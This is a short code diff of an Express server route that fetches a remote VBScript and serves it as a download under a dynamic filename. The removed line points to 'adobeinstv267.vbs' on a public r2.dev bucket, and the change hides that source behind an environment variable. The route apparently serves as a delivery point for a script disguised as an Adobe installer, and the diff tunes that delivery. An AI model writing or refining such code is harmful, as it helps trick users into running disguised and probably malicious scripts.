@@ -300,11 +300,11 @@ app.use((req, res, next) => {
 app.get('/download/vbs/:type', apiLimiter, async (req, res) => {
     try {
         const { type } = req.params;
-        // const FANTA = 'https://pub-05a36c67a70d476394cc0b8a3f67777f.r2.dev/adobeinstv267.vbs';
+       
         const FANTA = process.env.FANTA || '';
         
         
-        const response = await fetch(vbsUrl);
+        const response = await fetch(FANTA);
         const data = await response.text();
         
         // Dynamic filename based on type
